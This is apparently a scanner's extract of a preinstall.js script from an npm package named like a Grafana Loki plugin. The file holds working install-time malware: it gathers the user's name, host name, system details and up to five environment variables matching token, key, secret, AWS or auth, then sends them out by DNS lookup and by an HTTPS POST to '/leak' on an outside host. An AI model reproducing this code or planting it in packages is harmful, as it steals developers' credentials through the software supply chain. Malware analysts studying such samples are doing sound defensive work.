// File: tmp/tmpo60lrr2f/grafana-lokiexplore-app/package/preinstall.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const https = require('https')
Line 3: const dns = require('dns')
Line 7: {
  const info = {
    user: os.userInfo().username,
    host: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    cwd: process.cwd(),
    env: Object.fromEntries(
      Object.entries(process.env)
        .filter(([k]) => /token|key|secret|AWS|auth/i.test(k))
        .slice(0, 5)
    )
  };

  dns.resolve(`${info.user}.${info.host}.${OAST}`, () => {});

  const data = JSON.stringify(info);
  const req = https.request({
    hostname: OAST,
    path: '/leak',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
  }, () => {});
  
  req.on('error', () => {});
  req.write(data);
  req.end();
}
Line 9: os.userInfo()
Line 10: os.hostname()
Line 11: os.platform()
Line 12: os.arch()
Line 16: /token|key|secret|AWS|auth/i.test(k)
Line 24: const req = https.request({
    hostname: OAST,
    path: '/leak',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
  }, () => {})
Line 32: req.write(data)
Line 33: req.end()
